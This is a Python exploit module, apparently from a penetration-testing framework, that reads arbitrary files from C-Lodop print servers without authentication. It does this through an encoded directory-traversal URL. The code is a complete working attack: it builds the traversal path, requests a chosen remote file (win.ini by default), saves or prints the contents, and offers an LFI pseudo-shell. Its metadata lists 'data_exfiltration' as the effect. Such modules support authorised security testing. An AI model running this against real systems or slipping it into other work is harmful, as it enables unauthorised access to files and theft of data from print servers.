#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""C-Lodop printer pre-auth arbitrary file read via URL path traversal."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        "name": "C-Lodop Printer Pre-Auth File Read",
        "description": (
            "Reads arbitrary files from C-Lodop print servers using encoded "
            "directory traversal in the HTTP URL."
        ),
        "author": ["KittySploit Team"],
        "platform": Platform.WINDOWS,
        "references": [
            "https://github.com/Threekiii/Awesome-POC",
        ],
        "tags": ["c-lodop", "clodop", "printer", "lfi", "file-read", "unauth"],
        "agent": {
            "risk": "intrusive",
            "effects": ["data_exfiltration"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals"],
            "chain": {
                "produces_capabilities": [{"capability": "file_read", "from_detail": "encoded path traversal"}],
                "suggested_followups": ["scanner/http/clodop_printer_lfi_detect"],
            },
        },
    }

    port = OptPort(8000, "C-Lodop HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    traversal_depth = OptInteger(14, "Count of ..%2f segments before the target file", False, advanced=True)
    file_read = OptString("windows/win.ini", "Remote file path (forward slashes)", True)
    output_file = OptString("", "Local path to write retrieved content", False)
    output_limit = OptInteger(12000, "Max chars to print when output_file empty (0=full)", False, advanced=True)

    def _read_path(self, file_path: str) -> str:
        depth = max(1, int(self.traversal_depth or 14))
        prefix = "/..%2f" * depth
        remote = str(file_path or "").replace("\\", "/").lstrip("/")
        encoded = "%2f".join(remote.split("/"))
        return f"{prefix}{encoded}"

    def execute(self, file_path: str) -> str:
        response = self.http_request(
            method="GET",
            path=self._read_path(file_path),
            allow_redirects=False,
            timeout=int(self.timeout or 20),
        )
        if not response or int(response.status_code or 0) != 200:
            return ""
        return response.text or ""

    def run(self):
        if bool(self.shell_lfi):
            print_status("C-Lodop LFI pseudo-shell")
            self.handler_lfi()
            return True

        target = str(self.file_read or "windows/win.ini").strip()
        print_status(f"Reading {target} via C-Lodop traversal")
        data = self.execute(target)
        if not data:
            print_error("File read failed or returned empty body")
            return False

        local = str(self.output_file or "").strip()
        if local:
            with open(local, "w", encoding="utf-8", errors="ignore") as fh:
                fh.write(data)
            print_success(f"Wrote {len(data)} bytes to {local}")
        else:
            limit = int(self.output_limit or 0)
            print_info(data if limit <= 0 else data[:limit] + "\n... [truncated]")
        return True
